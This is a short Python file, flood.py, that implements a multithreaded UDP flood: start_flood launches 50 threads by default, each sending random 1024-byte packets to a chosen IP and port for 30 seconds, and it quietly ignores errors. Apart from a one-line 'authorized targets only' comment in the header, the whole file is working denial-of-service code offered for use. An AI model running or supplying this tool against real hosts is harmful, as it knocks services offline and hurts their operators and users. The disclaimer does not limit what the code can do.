# flood.py — UDP flood helper (authorized targets only)
import socket, threading, os, time

DEFAULT_DURATION = 30
DEFAULT_THREADS = 50

def _worker(family, target, stop):
    try:
        s = socket.socket(family, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < stop:
            try:
                s.sendto(os.urandom(1024), target)
            except Exception:
                pass
        s.close()
    except Exception:
        pass

def start_flood(ip, port, duration=DEFAULT_DURATION, threads=DEFAULT_THREADS):
    family = socket.AF_INET6 if ":" in ip else socket.AF_INET
    target = (ip, port, 0, 0) if family == socket.AF_INET6 else (ip, port)
    stop = time.time() + duration
    for _ in range(threads):
        threading.Thread(target=_worker, args=(family, target, stop), daemon=True).start()
    return {"ip": ip, "port": port, "threads": threads, "duration": duration}
